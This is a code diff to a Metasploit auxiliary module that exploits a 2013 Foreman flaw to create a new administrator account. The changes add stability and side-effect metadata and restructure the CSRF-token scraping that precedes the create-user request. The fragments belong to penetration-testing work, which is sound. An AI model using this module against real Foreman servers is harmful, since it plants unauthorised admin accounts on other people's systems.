@@ -26,7 +26,12 @@ class MetasploitModule < Msf::Auxiliary
         ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=966804'],
         ['URL', 'https://projects.theforeman.org/issues/2630']
       ],
-      'DisclosureDate' => 'Jun 6 2013'
+      'DisclosureDate' => 'Jun 6 2013',
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
+        'Reliability' => []
+      }
     )
 
     register_options(
@@ -39,7 +44,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('NEWPASSWORD', [true, 'The password of the new admin account']),
         OptString.new('NEWEMAIL', [true, 'The email of the new admin account']),
         OptString.new('TARGETURI', [ true, 'The path to the application', '/']),
-      ], self.class
+      ]
     )
   end
 
@@ -86,19 +91,19 @@ class MetasploitModule < Msf::Auxiliary
     if res.headers['Location'] =~ %r{users/login$}
       print_error('Failed to retrieve the CSRF token')
       return
-    else
-      csrf_param = ::Regexp.last_match(1) if res.body =~ %r{<meta +content="(.*)" +name="csrf-param" */?>}i
-      csrf_token = ::Regexp.last_match(1) if res.body =~ %r{<meta +content="(.*)" +name="csrf-token" */?>}i
+    end
 
-      if csrf_param.nil? || csrf_token.nil?
-        csrf_param = ::Regexp.last_match(1) if res.body =~ %r{<meta +name="csrf-param" +content="(.*)" */?>}i
-        csrf_token = ::Regexp.last_match(1) if res.body =~ %r{<meta +name="csrf-token" +content="(.*)" */?>}i
-      end
+    csrf_param = ::Regexp.last_match(1) if res.body =~ %r{<meta +content="(.*)" +name="csrf-param" */?>}i
+    csrf_token = ::Regexp.last_match(1) if res.body =~ %r{<meta +content="(.*)" +name="csrf-token" */?>}i
 
-      if csrf_param.nil? || csrf_token.nil?
-        print_error('Failed to retrieve the CSRF token')
-        return
-      end
+    if csrf_param.nil? || csrf_token.nil?
+      csrf_param = ::Regexp.last_match(1) if res.body =~ %r{<meta +name="csrf-param" +content="(.*)" */?>}i
+      csrf_token = ::Regexp.last_match(1) if res.body =~ %r{<meta +name="csrf-token" +content="(.*)" */?>}i
+    end
+
+    if csrf_param.nil? || csrf_token.nil?
+      print_error('Failed to retrieve the CSRF token')
+      return
     end
 
     print_status("Sending create-user request to #{target_url('users')}...")
